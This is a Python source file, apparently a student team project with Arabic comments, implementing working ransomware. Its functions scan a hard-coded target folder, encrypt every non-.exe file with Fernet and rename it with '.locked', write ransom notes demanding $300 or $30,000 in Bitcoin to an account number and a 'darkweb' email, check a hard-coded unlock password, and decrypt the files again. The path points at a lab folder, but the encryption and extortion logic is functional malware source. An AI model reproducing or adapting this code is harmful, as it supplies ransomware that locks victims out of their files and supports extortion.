import os
import sys
import tkinter as tk
from tkinter import messagebox, simpledialog
from cryptography.fernet import Fernet
import datetime

# =========================================================================
# Developer: Doaa
# Role: Configuration, Threat Logic & Security Verification
# =========================================================================

# 1. إعداد المسارات الثابتة
FIX_TARGET_PATH = r"/home/kali/PyCharmMiscProject/dist/target_folder"
FIX_KEY_PATH = r"/home/kali/PyCharmMiscProject/dist/thekey.key"
RANSOM_NOTE_NAME = "Payment_instructions.txt"

# 2. وظيفة إنشاء رسالة التهديد (أنتِ من يحدد محتواها)
def create_threat_note(folder_path):
    note_path = os.path.join(folder_path, RANSOM_NOTE_NAME)
    try:
        with open(note_path, "w") as f:
            f.write("!!! YOUR SYSTEM IS HACKED !!!\n")
            f.write("--------------------------------\n")
            f.write(f"Attack Date: {datetime.datetime.now()}\n")
            f.write("All your files are encrypted with military-grade encryption.\n")
            f.write("To get the password, Pay $300 to: 3010333030\n")
    except Exception as e:
        print(f"Error creating note: {e}")

# 3. وظيفة التحقق من الباسورد (أنتِ الحارس)
def verify_payment_password(input_password):
    MASTER_PASSWORD = "money2024"
    return input_password == MASTER_PASSWORD



# =========================================================================
# Developer: Hanan
# Section: File System Scanning Logic
# =========================================================================

def get_target_files():
    # نستخدم المسار الثابت الذي حددته القائدة
    target_path = FIX_TARGET_PATH

    files_list = []

    if os.path.exists(target_path):
        for filename in os.listdir(target_path):
            full_path = os.path.join(target_path, filename)
            # نستبعد ملفات النظام والملفات التنفيذية
            if os.path.isfile(full_path) and not filename.endswith(".exe"):
                files_list.append(full_path)
    else:
        print(f"DEBUG: Path not found: {target_path}")

    return files_list, target_path






# =========================================================================
# Developer: Alaa
# Section: Key Generation & Encryption Logic
# =========================================================================

def load_or_generate_key():
    # نستخدم مسار المفتاح الثابت
    if os.path.exists(FIX_KEY_PATH):
        return open(FIX_KEY_PATH, "rb").read()
    else:
        # لو المفتاح مش موجود، ننشئه في مكانه الثابت
        key = Fernet.generate_key()
        try:
            with open(FIX_KEY_PATH, "wb") as key_file:
                key_file.write(key)
        except Exception as e:
            print(f"Key Error: {e}")
        return key

def encrypt_all():
    key = load_or_generate_key()
    files, folder_path = get_target_files()

    # 1. إنشاء رسالة الفدية
    ransom_note = os.path.join(folder_path, "Payment_instructions.txt")
    try:
        with open(ransom_note, "w") as f:
            f.write("ALL YOUR FILES ARE ENCRYPTED!\n")
            f.write("Pay $30,000 Bitcoin to get the password.\n")
            f.write("Send money to: 3010333030\n")
            f.write("Contact: hacker@darkweb.com")
    except:
        pass

    # 2. تشفير الملفات
    for file_path in files:
        try:
            if not file_path.endswith(".locked"):
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted_data = Fernet(key).encrypt(data)

                with open(file_path, "wb") as f:
                    f.write(encrypted_data)

                # تغيير الاسم
                os.rename(file_path, file_path + ".locked")
        except Exception:
            pass




from cryptography.fernet import Fernet
import os


# ==========================================
# Developer: Aseel
# Module: Decryption & Recovery
# ==========================================

def decrypt_files(files_list, key):
  
    count = 0
    cipher = Fernet(key)

    for file_path in files_list:
        try:
            if file_path.endswith(".locked"):
                # قراءة الملف المشفر
                with open(file_path, "rb") as f:
                    data = f.read()

                # فك التشفير
                decrypted_data = cipher.decrypt(data)

                # حفظ البيانات الأصلية
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)

                # استعادة الاسم الأصلي
                original_name = file_path.replace(".locked", "")
                os.rename(file_path, original_name)
                count += 1
                print(f"[Aseel-Decryption] Recovered: {original_name}")
        except Exception:
            pass  # تجاهل الملفات التي تفشل

    return count


